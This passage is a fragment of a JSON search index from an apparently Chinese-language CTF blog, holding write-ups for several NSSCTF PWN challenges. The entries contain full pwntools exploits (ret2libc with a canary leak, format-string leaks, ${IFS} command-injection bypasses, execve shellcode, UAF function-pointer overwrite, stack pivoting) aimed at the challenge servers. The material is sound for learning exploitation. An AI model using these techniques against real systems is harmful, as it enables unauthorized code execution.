int.from_bytes(canary,'little')\nprint(hex(canary))\npop_rdi = 0x400863\nputs_got = 0x601018\nputs_plt = 0x4005B0\nret = 0x40059e\nfun = 0x4006E2\npayload1 = b'a'*0x48 + p64(canary) + b'a'*0x8 + p64(pop_rdi)\npayload1 += p64(puts_got) + p64(puts_plt) + p64(fun)\np.sendline(payload1)\np.recvline()\nputs_addr = p.recvline()[:-1]\nprint('------&gt;',puts_addr)\nputs_addr = int.from_bytes(puts_addr,'little')\nlibc_addr = puts_addr - 0x80aa0\nsh_addr = libc_addr + 0x1b3e1a\nsys_addr = libc_addr + 0x4f550\np.sendline(b'a')\npayload2 = b'a'*0x48 + p64(canary) + b'a'*0x8\npayload2 += p64(pop_rdi) + p64(sh_addr) + p64(ret) + p64(sys_addr)\np.sendline(payload2)\np.interactive()\n</code></pre>"},{"location":"NSSCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#2_find_flag","title":"\u9898\u76ee2_find_flag","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</code></p> </li> <li> <p>\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u7684\u9898\u76ee</p> </li> <li>\u5148\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236\uff0c\u53d1\u73b0\u5168\u90e8\u4fdd\u62a4\u90fd\u5f00\u8d77\u6765\u4e86</li> </ul> <p></p> <ul> <li>\u518d\u67e5\u770b\u4e00\u4e0b\u53cd\u7f16\u8bd1\u540e\u7684\u7a0b\u5e8f\u4ee3\u7801\uff0c\u67e5\u770b\u7a0b\u5e8f\u8fd0\u884c\u7684\u903b\u8f91\uff0c\u4e3b\u8981\u95ee\u9898\u51fa\u73b0\u5728\u8fd9\u91cc\uff0c\u601d\u8def\u5c31\u662f\u5148\u6cc4\u9732\u6808\u4e0a\u7684Canary\u503c\u548cret\u7684\u5730\u5740\uff0c\u7136\u540e\u8ba1\u7b97\u7a0b\u5e8f\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u8fdb\u884c\u6808\u6ea2\u51fa\u3002</li> </ul> <p></p> <ul> <li> <p>\u8fd9\u91cc\u53d1\u73b0\u4e86\u540e\u95e8\u51fd\u6570</p> </li> <li> <p>\u7531\u4e8e\u672c\u5730\u548c\u9776\u673a\u7684\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u504f\u79fb\u4e0d\u4e00\u6837\uff0c\u76f4\u63a5\u6253\u8fdc\u7a0b\uff0c\u4e0d\u8981\u52a8\u6001\u8c03\u8bd5\u3002</p> </li> <li>exp\u5982\u4e0b\uff1a</li> <li>\u5148\u901a\u8fc7\u7206\u7834\u53d1\u73b0\uff0c<code>%17$p</code>\u662f\u6cc4\u9732Canary\u7684\u503c\u548c<code>%19$p</code>\u6cc4\u9732\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u7684\u503c</li> </ul> <pre><code>from pwn import *\ncontext(log_level='debug')\nfor i in range(100):\n    p = remote('node4.anna.nssctf.cn',28422)\n    payload = b'%' + str(i).encode('utf-8') + b'$p'\n    p.sendlineafter(b'Hi! What\\'s your name?',payload)\n    p.interactive()\n    p.close()\n</code></pre> <ul> <li>\u6700\u540e\u5199exp\uff1a</li> </ul> <pre><code>from pwn import *\ncontext(log_level='debug')\np = remote('node4.anna.nssctf.cn',28467)\npayload = b'%17$p' + b'-----' + b'%19$p'\np.sendlineafter(b'Hi! What\\'s your name?',payload)\nleak = p.recvline()\nprint(leak)\ncanary = leak[19:37]\naddr = leak[42:-2]\nprint('canary----&gt;',canary)\nprint('addr-----&gt;',addr)\ncanary = int(canary.decode('utf-8'),16)\naddr = int(addr.decode('utf-8'),16)\naddr = addr - 0x146F\ncatflag = addr + 0x1231\nprint('canary:',hex(canary))\npayload = b'a'*0x38 + p64(canary) + b'a'*0x8 + p64(catflag)\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"NSSCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#3_singout","title":"\u9898\u76ee3_singout","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>RCE</code>\u3001<code>Linux</code>\u547d\u4ee4\u7ed5\u8fc7</p> </li> <li> <p>\u8fd9\u9898\u6ca1\u7ed9\u9644\u4ef6\uff0c\u4e3b\u8981\u8003\u8651\u7684\u5c31\u662f\u547d\u4ee4\u7ed5\u8fc7\uff08\u611f\u89c9\u4e3b\u8981\u9760\u7684\u662fweb\uff09\uff0c\u6ca1\u5565\u547d\u4ee4\u7ed5\u8fc7\u7684\u7ecf\u9a8c</p> </li> <li>\u76f4\u63a5\u770bwp\uff0cwp\u8bf4\u53ef\u4ee5\u4f7f\u7528</li> </ul> <pre><code>nl${IFS}f*\nnl$IFS$9f*\ntail ./*\ntail$IFS$9./f*\n</code></pre> <ul> <li>\u8fd9\u8fb9\u7406\u89e3\u4e00\u4e0b\u547d\u4ee4\u7684\u610f\u601d\uff1a</li> </ul> <p>nl\u662fLinux\u7cfb\u7edf\u7684\u547d\u4ee4\uff0c\u7528\u4e8e\u7ed9\u6bcf\u4e2a\u6587\u4ef6\u7f16\u53f7</p> <p>${IFS}\u4e2d\uff0cIFS\u662fshell\u7279\u6b8a\u73af\u5883\u53d8\u91cf\uff0c\u4ee3\u8868\u5185\u90e8\u5b57\u6bb5\u5206\u9694\u7b26\u8fd9\u91cc\u8868\u793a\u7a7a\u683c\u3002\u8fd9\u8fb9\u4f7f\u7528${IFS}\u7684\u4f5c\u7528\u5c31\u662f\u5145\u5f53\u7a7a\u683c\uff0c\u56e0\u4e3a\u7a7a\u683c\u53ef\u80fd\u4e5f\u88ab\u7981\u7528\u4e86</p> <p>f*\u8868\u793a\u7684\u662f\u5f53\u524d\u76ee\u5f55\u4e0b\u6240\u6709\u4ee5f\u5f00\u5934\u7684\u6587\u4ef6</p> <p>\u6267\u884c\u8be5\u547d\u4ee4\u7684\u5c31\u76f8\u5f53\u4e8e\u6267\u884c<code>nl f*</code></p> <p>\u200b  <code>nl</code> \u547d\u4ee4\u4f1a\u9010\u884c\u8bfb\u53d6\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5e76\u4e3a\u6bcf\u4e00\u884c\u6dfb\u52a0\u884c\u53f7\u3002</p> <ul> <li>\u8fd9\u91cc\u6211\u5728\u672c\u5730\u5b9e\u9a8c\u4e00\u4e0b\uff1a</li> <li>\u5b83\u4f1a\u8bfb\u53d6\u6587\u4ef6\u91cc\u9762\u7684\u5185\u5bb9\u3002</li> <li>\u9010\u884c\u6807\u4e0a\u884c\u53f7\u4e4b\u540e\u5c31\u4f1a\u9010\u884c\u8f93\u51fa\u3002</li> </ul> <p></p>"},{"location":"NSSCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#4_shellcode","title":"\u9898\u76ee4_shellcode\uff1f","text":"<ul> <li>\u5148\u67e5\u770b\u4fdd\u62a4\u673a\u5236\u53d1\u73b0\u53ea\u6709Canary\u6ca1\u5f00\uff0c\u5176\u4ed6\u90fd\u5f00\u4e86</li> </ul> <ul> <li>\u67e5\u770b\u53cd\u7f16\u8bd1\u7684\u4ee3\u7801\uff0c\u8fd9\u8fb9\u5e94\u8be5\u5c31\u662f\u7b80\u5355\u7684\u5199\u4e00\u4e2ashellcode</li> </ul> <ul> <li>\u76f4\u63a5\u5f00\u5199\uff0c\u867d\u7136python\u6709\u81ea\u52a8\u751f\u6210\u5de5\u5177\uff0c\u4f46\u662f\u56e0\u4e3a\u662f\u7ec3\u4e60\uff0c\u6240\u4ee5\u5c1d\u8bd5\u81ea\u5df1\u591a\u5199\u4e00\u70b9\u7b80\u5355shellcode\uff0c\u4e4b\u540e\u8981\u78b0\u5230\u8981\u81ea\u5df1\u5199\u7684\u5c31\u4e0d\u4f1a\u592a\u7262</li> </ul> <pre><code>from pwn import *\ncontext(arch='amd64')\np = remote('node5.anna.nssctf.cn',23069)\na = asm(\"\"\"\n    mov rax,59\n    mov rbx,0x0068732f6e69622f\n    push rbx\n    mov rdi,rsp\n    xor rsi,rsi\n    xor rdx,rdx\n    syscall\n    \"\"\")\np.sendline(a)\np.interactive()\n</code></pre>"},{"location":"NSSCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#5_hubuctf-2022-fmt","title":"\u9898\u76ee5_[HUBUCTF 2022 \u65b0\u751f\u8d5b]fmt","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e</code></p> </li> <li> <p>\u8fd9\u9898\u8fd8\u4ee5\u4e3a\u662f\u52ab\u6301got\u8868\uff0c\u7ed3\u679c\u662f\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b80\u5355\u8fd0\u7528</p> </li> <li>\u76f4\u63a5\u67e5\u770b\u9644\u4ef6\uff0c\u53d1\u73b0\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f4\u63a5\u6cc4\u9732\u6808\u4e0a\u7684\u503c\u5c31\u884c\u3002</li> </ul> <p></p> <ul> <li>\u76f4\u63a5\u7206\u7834flag\u6240\u5728\u7684\u6808\uff1a</li> </ul> <pre><code>from pwn import *\np = remote('node5.anna.nssctf.cn',29340)\nfor i in range(100):\n    p.recvline()\n    p.sendline(b'%'+str(i).encode('utf-8')+b'$p')\n    a = p.recvline()\n    print(a)\n</code></pre> <ul> <li>\u7206\u7834\u51fa\u6765\u540e\u76f4\u63a5\u811a\u672c\u4e00\u628a\u68ad\uff1a</li> </ul> <pre><code>a = [0x657b46544353534e,0x2d35633332386366,0x3837342d33653834,0x392d303432612d66,0x3331326130306634,0xa7d393636]\nfor i in range(len(a)):\n    print(libnum.n2s(a[i]))\n\nb = ['e{FTCSSN','-5c328cf','874-3e84','9-042a-f','312a00f4','\\n}966']\nfor i in range(len(b)):\n    print(b[i][-1::-1],end='')\n</code></pre>"},{"location":"NSSCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#6_nisactf-2022uaf","title":"\u9898\u76ee6_[NISACTF 2022]UAF","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>UAF</code>\u3001<code>fastbin_UAF</code></p> </li> <li> <p>\u4eca\u5929\u6765\u6253\u4e00\u9898\u5806\u9898\uff0c\u9898\u76ee\u5df2\u7ecf\u8868\u660e\u4e86\u662f<code>UAF</code>\u6f0f\u6d1e\uff0c\u6240\u4ee5\u76f4\u63a5\u6765\u5206\u6790\u7a0b\u5e8f\u3002\u5148\u6765<code>check</code>\u4e00\u4e0b\u7a0b\u5e8f\u3002\u53d1\u73b0\u662f<code>32\u4f4d</code>\u7684\u7a0b\u5e8f\uff0c\u6ca1\u6709\u5f00<code>PIE</code>\u968f\u673a\u5730\u5740\u504f\u79fb\u3002</p> </li> </ul> <p></p> <ul> <li>\u7136\u540e\u4f7f\u7528IDA\u5206\u6790\u8be5\u7a0b\u5e8f\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u7ecf\u5178\u7684\u5806\u83dc\u5355\u9898\u76ee\uff0c\u7136\u540e\u4f7f\u7528<code>scanf</code>\u51fd\u6570\u8f93\u5165\u6211\u4eec\u8981\u9009\u62e9\u7684\u83dc\u5355\u9009\u9879\u3002</li> </ul> <p></p> <p></p> <ul> <li>\u63a5\u4e0b\u6765\u5148\u67e5\u770b<code>create()</code>\u51fd\u6570\uff0c\u5728\u8fd9\u8fb9\u6709\u4e24\u4e2a\u5728<code>.bss</code>\u6bb5\u4e0a\u7684\u5168\u5c40\u53d8\u91cf<code>i</code>\u548c<code>page</code></li> <li>\u8be5\u7a0b\u5e8f\u5148\u8f93\u5165\u6211\u4eec\u7533\u8bf7<code>page</code>\u7684\u7d22\u5f15\uff0c\u7136\u540e\u5bf9\u8fd9\u4e2a\u7d22\u5f15\u8fdb\u884c\u68c0\u67e5\uff0c\u5f53<code>i</code>\u57280\u52309\u4e4b\u95f4\u5c31\u4f1a\u5148\u521b\u5efa\u4e00\u4e2a\u5806\u5757\uff0c\u5e76\u5c06\u5806\u5757\u7684\u5730\u5740\u5b58\u50a8\u5728<code>page</code>\u8fd9\u4e2a<code>\u6307\u9488\u6570\u7ec4</code>\u8fd9\u8fb9</li> <li>\u7136\u540e\u5bf9<code>i</code>\u8fdb\u884c\u68c0\u67e5\u5982\u679c<code>i</code>\u5927\u4e8e9\u5c31\u6ca1\u6709<code>PAGE</code>\u5206\u914d\u7ed9\u65b0\u7533\u8bf7\u7684\u5806\u5757\uff0c\u5982\u679c\u8fd8\u6709\u7a7a\u95f4<code>i</code>\u5c31\u4f1a\u81ea\u589e1</li> <li>\u5f53<code>i=0</code>\u7684\u65f6\u5019\u4f1a\u5148\u521d\u59cb\u5316<code>page</code>\u5373\u5728\u8be5\u5806\u5757\u91cc\u9762\u524d4\u5b57\u8282\u5b58\u50a8\u7740\u4e00\u4e32\u6570\u5b57\uff0c\u540e4\u5b57\u8282\u5b58\u50a8\u7740\u51fd\u6570\u6307\u9488\uff0c\u7528\u4e8e\u8f93\u51fa\u529f\u80fd\u3002</li> </ul> <p></p> <ul> <li>\u901a\u8fc7\u67e5\u770b<code>.bss</code>\u6bb5\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a<code>i</code>\u662f\u4e00\u4e2aint\u7c7b\u578b\u7684\u53d8\u91cf\u5360<code>4</code>\u5b57\u8282\uff0c\u800c<code>page</code>\u5f88\u660e\u663e\u662f\u4e00\u4e2a\u6307\u9488\u6570\u7ec4\uff0c\u8be5\u6570\u7ec4\u5b9a\u4e49\u4e86<code>10</code>\u4e2a\u6307\u9488\u53d8\u91cf</li> </ul> <p></p> <ul> <li>\u63a5\u4e0b\u6765\u6211\u4eec\u518d\u6765\u67e5\u770b\uff0c<code>edit()</code>\u8fd9\u90e8\u5206\u51fd\u6570\u6267\u884c\u4ec0\u4e48</li> <li>\u9996\u5148\u662f\u8f93\u5165\u6211\u4eec\u8981\u4fee\u6539\u7684\u5806\u5757\u7d22\u5f15</li> <li>\u7136\u540e\u4f7f\u7528<code>scanf</code>\u5411\u8be5\u5806\u5757\u8f93\u5165\u5185\u5bb9\uff0c\u4f46\u662f\u8fd9\u91cc\u597d\u50cf\u5b58\u5728\u6ea2\u51fa</li> </ul> <p></p> <ul> <li>\u4e4b\u540e\u518d\u6765\u67e5\u770b<code>del()</code>\u8fd9\u4e2a\u51fd\u6570\u7684\u529f\u80fd\uff0c\u8be5\u51fd\u6570\u7684\u529f\u80fd\u5c31\u662f<code>free</code>\u6211\u4eec\u6307\u5b9a\u7684\u5806\u5757\uff0c\u4f46\u662f\u8fd9\u8fb9\u5b58\u5728\u4e00\u4e2a<code>UAF</code>\u7684\u6f0f\u6d1e\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u80fd\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u3002</li> </ul> <p></p> <ul> <li>\u4e4b\u540e\u518d\u6765\u67e5\u770b<code>show</code>\u8fd9\u4e2a\u51fd\u6570\u7684\u529f\u80fd\uff0c\u662f\u8f93\u51fa\u6211\u4eec\u6240\u9009\u62e9\u7684\u5806\u5757\uff0c\u4f46\u662f\u8fd9\u91cc\u8981\u6ce8\u610f\u4e00\u4e0b\uff0c\u5c31\u662f\u5f53\u6211\u4eec\u8981\u8f93\u5165<code>page[0]</code>\u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u6307\u9488\uff0c\u5373\u8be5\u51fd\u6570\u6307\u9488\u5b58\u653e\u5728<code>page[1]</code>\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u53bb\u8f93\u51fa<code>page[0]</code>\u7684\u5185\u5bb9\u3002</li> </ul> <p></p> <ul> <li>\u6211\u4eec\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u540e\u95e8\u51fd\u6570</li> </ul> <p></p> <ul> <li>\u6240\u4ee5\u601d\u8def\u5982\u4e0b\uff1a</li> <li>\u901a\u8fc7<code>UAF</code>\u6f0f\u6d1e\u4fee\u6539\u51fd\u6570\u6307\u9488\u4e3a\u540e\u95e8\u51fd\u6570\uff0c\u7136\u540e\u518d\u4fee\u6539\u5411<code>page[0][0]</code>\u4e2d\u5199\u5165<code>/bin/sh\\x00</code>\u6216\u8005<code>/sh\\x00\\x00</code></li> <li> <p>\u8fd9\u6837\u6211\u4eec\u5c31\u52ab\u6301\u4e86\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u5230\u540e\u95e8\u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u6210\u529f\u6267\u884c<code>system(\"/bin/sh\")</code></p> </li> <li> <p>\u63a5\u4e0b\u6765\u4f7f\u7528\u52a8\u6001\u8c03\u8bd5\u67e5\u770b\u5806\u5757\u7684\u5177\u4f53\u8fd0\u884c\u60c5\u51b5</p> </li> <li>\u9996\u9009\u6211\u4eec\u53d1\u73b0\u7b2c\u4e00\u6b21\u662f\u5806\u5757\u7684\u521d\u59cb\u5316</li> </ul> <p></p> <ul> <li> <p>\u6240\u4ee5\u6211\u8981\u5229\u7528<code>UAF</code>\u6f0f\u6d1e\uff0c\u5c06\u8be5\u5bf9<code>page[0]</code>\u8fd9\u91cc\u9762\u7684\u5185\u5bb9\u8fdb\u884c\u4fee\u6539\u4ece\u800c\u6267\u884c\u7a0b\u5e8f\u63a7\u5236\u6d41\uff0c\u63a5\u4e0b\u6765\u8fdb\u884c\u5806\u7684\u5e03\u5c40\u3002\u9996\u5148\u6211\u4eec\u8981\u5148\u521d\u59cb\u5316\u4e00\u4e2a<code>page</code>\uff0c\u4e3a\u4e86\u9632\u6b62\u5806\u5757\u7684\u5408\u5e76\uff0c\u6211\u4eec\u8fd8\u8981\u518d\u7533\u8bf7\u4e00\u4e2a\u5806\u5757\u3002\u4e4b\u540e\u5148\u91ca\u653e<code>page[0]</code>\u6240\u6307\u5411\u7684\u5806\u5757\uff0c\u518d\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5806\u5757\u5c31\u53ef\u4ee5\u628a<code>page[0]</code>\u7684\u5806\u5757\u7ed9\u7533\u8bf7\u5230<code>page[2]</code>\u8fd9\u8fb9\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u8c03\u7528<code>edit</code>\u51fd\u6570\u5bf9\u8fd9\u4e2a\u5806\u5757\u8fdb\u884c\u4fee\u6539\u4e86\u3002</p> </li> <li> <p>exp\u5982\u4e0b\uff1a</p> </li> </ul> <pre><code>from pwn import *\ncontext(log_level='debug')\np = remote('node4.anna.nssctf.cn',28471)\ndef create():\n    p.sendlineafter(b':',b'1')\n\ndef edit(page,string):\n    p.sendlineafter(b':',b'2')\n    p.sendlineafter(b'Input page\\n',str(page).encode('utf-8'))\n    p.sendlineafter(b'Input your strings\\n',string)\n\ndef delete(page):\n    p.sendlineafter(b':',b'3')\n    p.sendlineafter(b'Input page\\n',str(page).encode('utf-8'))\n\ndef show(page):\n    p.sendlineafter(b':',b'4')\n    p.sendlineafter(b'Input page\\n',str(page).encode('utf-8'))\n\npause()\ncreate()\ncreate()\ndelete(0)\ncreate()\npayload = b'\\sh\\x00' + p32(0x8048642)\nedit(2,payload)\nshow(0)\np.interactive()\n</code></pre>"},{"location":"NSSCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#7_hnctf-2022-week1ezcmp","title":"\u9898\u76ee7_[HNCTF 2022 Week1]ezcmp","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>gdb\u52a8\u6001\u8c03\u8bd5</code></p> </li> <li> <p>\u8be5\u9898\u6bd4\u8f83\u7b80\u5355\uff0c\u4e0d\u4ec5\u7ed9\u4e86\u9644\u4ef6\uff0c\u8fd8\u7ed9\u4e86\u6e90\u7801\u3002\u8fd9\u8fb9\u76f4\u63a5\u67e5\u770b\u4e00\u4e0b\u6e90\u7801</p> </li> </ul> <pre><code>#include&lt;stdio.h&gt;\nchar buff[100];\nint v0;\nchar buffff[]=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ1234\";\nchar bua[]=\"abcdefghijklmnopqrstuvwxyz4321\";\nchar* enccrypt(char *buf){\n    int a;\n    for(int i=0;i&lt;29;i++){\n        a=rand();\n        buf[i]^=buffff[i];\n        buff[i]^=bua[i];\n        for(int j=29;j&gt;=0;j--){\n            buf[j]=buff[i];\n            buf[i]+='2';\n        }\n        buf[i]-=((bua[i]^0x30)*(buffff[i]&gt;&gt;2)&amp;1)&amp;0xff;\n        buf[i]+=(a%buff[i])&amp;0xff;\n    }\n}\nint main(){\n    setbuf(stdin,0);\n    setbuf(stderr,0);\n    setbuf(stdout,0);\n    puts(\"GDB-pwndbg maybe useful\");\n    char buf[]=\"Ayaka_nbbbbbbbbbbbbbbbbb_pluss\";\n    strcpy(buff,buf);\n    char test[30];\n    int v0=1;\n    srand(v0);\n    enccrypt(buff);\n    read(0,test,30);\n    if(!strncmp(buff,test,30)){\n        system(\"/bin/sh\");\n    }\n    else {\n        puts(\"Oh No!You lose!!!\");\n        exit(0);\n    }\n    return;\n\n}\n</code></pre> <ul> <li>\u8be5\u9898\u7a0b\u5e8f\u5c31\u662f\u5c06<code>Ayaka_nbbbbbbbbbbbbbbbbb_pluss</code>\u8fd9\u4e2a\u5b57\u7b26\u4e32\u8fdb\u884c\u52a0\u5bc6\uff0c\u8ba9\u6211\u4eec\u8f93\u5165\u6570\u636e\uff0c\u7136\u540e\u4e0e\u52a0\u5bc6\u8fc7\u540e\u7684\u6570\u636e\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u4e0e\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4e00\u81f4\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5<code>getshell</code>\uff0c\u8fd9\u91cc\u5148\u4f7f\u7528<code>IDA</code>\u9006\u5411\u4e00\u4e0b\u8be5\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u627e\u5230main\u51fd\u6570\u4e2d<code>call read</code>\u7684\u5730\u5740\u3002\u4ee5\u53ca\u627e\u5230\u5168\u5c40\u53d8\u91cf<code>buff</code>\u7684\u5730\u5740\u3002</li> </ul> <p></p> <p></p> <ul> <li>\u7136\u540e\u4f7f\u7528<code>gdb</code>\u52a8\u6001\u8c03\u8bd5\uff0c\u5728<code>call read</code>\u8fd9\u4e2a\u4f4d\u7f6e\u53bb\u8bbe\u7f6e\u65ad\u70b9\uff0c\u8bbe\u7f6e\u5b8c\u65ad\u70b9\u540e\u4f7f\u7528<code>c</code>\u547d\u4ee4</li> </ul> <p></p> <ul> <li>\u8fd9\u65f6\u6211\u4eec\u518d\u67e5\u770b\u5168\u5c40\u53d8\u91cf<code>buff</code>\u91cc\u9762\u7684\u503c\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u770b\u5230\u52a0\u5bc6\u540e\u7684\u6570\u636e\u4e86</li> </ul> <p></p> <ul> <li>\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u7f16\u5199exp\uff1a</li> </ul> <pre><code>from pwn import *\np = remote('node5.anna.nssctf.cn',27273)\npayload = p64(0x144678aadc0e4072) + p64(0x84b6e81a4c7eb0e2)\npayload+= p64(0xf426588abcee2052) + p64(0xc8cb2c5e90c2)\np.send(payload)\np.interactive()\n</code></pre> <p></p>"},{"location":"NSSCTF/PWN/1%E7%AC%AC%E4%B8%80%E9%A1%B5/#8_hdctf-2023keep-on","title":"\u9898\u76ee8_[HDCTF 2023]KEEP ON","text":"<ul> <li> <p>\u8003\u70b9\uff1a<code>\u6808\u8fc1\u79fb</code></p> </li> <li> <p>\u62ff\u5230\u9644\u4ef6\u5148\u67e5\u770b\u4e00\u4e0b\u4fdd\u62a4\u673a\u5236\uff0c\u53d1\u73b0\u4fdd\u62a4\u673a\u5236\u6ca1\u6709\u5f00Canary\u548cPIE</p> </li> </ul> <p></p> <ul> <li>\u7136\u540e\u4f7f\u7528<code>IDA</code>\u53cd\u7f16\u8bd1\u67e5\u770b\u4ee3\u7801\uff0c\u5148\u6765\u67e5\u770b<code>main</code>\u51fd\u6570\uff0c\u53d1\u73b0<code>main</code>\u51fd\u6570\u53ea\u6709\u4e00\u4e2a\u8f93\u51fa\uff0c\u548c\u521d\u59cb\u5316\uff0c\u6bd4\u8f83\u91cd\u8981\u7684\u5728<code>vuln</code>\u8fd9\u4e2a\u51fd\u6570\u4e2d</li> </ul> <p></p> <ul> <li>\u63a5\u4e0b\u6765\u76f4\u63a5\u67e5\u770b<code>vuln</code>\u8fd9\u4e2a\u51fd\u6570</li> <li>\u53d1\u73b0\u6709\u4e24\u4e2a<code>read()</code>\u51fd\u6570\uff0c\u5176\u4e2d\u7b2c\u4e8c\u4e2a<code>read</code>\u51fd\u6570\u5b58\u5728\u6ea2\u51fa\uff0c\u53ef\u4ee5\u6ea2\u51fa<code>0x10</code>\u4e2a\u5b57\u8282\u3002</li> <li>\u7136\u540e<code>printf(s)</code>\u8fd9\u8fb9\u8fd8\u5b58\u5728\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u6f0f\u6d1e</li> </ul> <p></p> <ul> <li>\u7531\u4e8e\u53ef\u4ee5\u6ea2\u51fa\u7684\u7a7a\u95f4\u592a\u5c0f\u4e86\uff0c\u6240\u4ee5\u67e5\u770b\u6c47\u7f16\u4ee3\u7801\uff0c\u770b\u770b\u662f\u5426\u6709<code>leave</code> \u548c<code>ret</code>\u8fd9\u4e2a\u6c47\u7f16\u8bed\u53e5\u3002\u53d1\u73b0\u6709<code>leave</code>\u548c<code>ret</code>\u8fd9\u4e2a\u6c47\u7f16\u8bed\u53e5\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u6808\u8fc1\u79fb\u64cd\u4f5c\u3002</li> </ul> <p></p> <ul> <li> <p>\u601d\u8def\u5c31\u662f\uff1a\u5148\u5229\u7528\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u6f0f\u6d1e\u6cc4\u9732\u6808\u5730\u5740\uff0c\u5e76\u8ba1\u7b97\u504f\u79fb\uff0c\u8fd9\u6837\u5728\u7b2c\u4e8c\u6b21\u8f93\u5165\u65f6\uff0c\u5728\u6ca1\u6ea2\u51fa\u4e4b\u524d\u5c31\u53ef\u4ee5\u6784\u9020rop\u94fe\uff0c\u4f7f\u7528\u6808\u8fc1\u79fb\uff0c\u5c06<code>rsp</code>\u6307\u9488\u56de\u5230\u4fdd\u5b58<code>s</code>\u7684\u53d8\u91cf\u4e2d\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u6210\u529f\u6784\u9020rop\u94fe\u3002</p> </li> <li> <p>exp\u5982\u4e0b\uff1a</p> </li> </ul> <pre><code>from pwn import *\ncontext(log_level='debug')\n#p = remote('node4.anna.nssctf.cn',28694)\np = process('./hdctf')\n#gdb.attach(p)\n#pause()\npayload = b'%16$p'\np.sendlineafter(b'name: \\n',payload)\nstack = p.recvline()[6:-1]\nstack = int(stack,16)\nprint('stack----&gt;',hex(stack))\nstack = stack - 0x60\nleave = 0x4007F2\npop_rdi =0x4008d3\nsys_addr = 0x40085D\nret = 0x400864\npayload1 = p64(stack)+p64(pop_rdi)+p64(stack+0x20)+p64(sys_addr)\npayload1 += b'/bin/sh\\x00'+b'a'*0x28\npayload1 += p64(stack)+p64(leave)\np.sendlineafter(b'keep on !\\n',payload1)\np.interactive()\n</code></pre>"}]}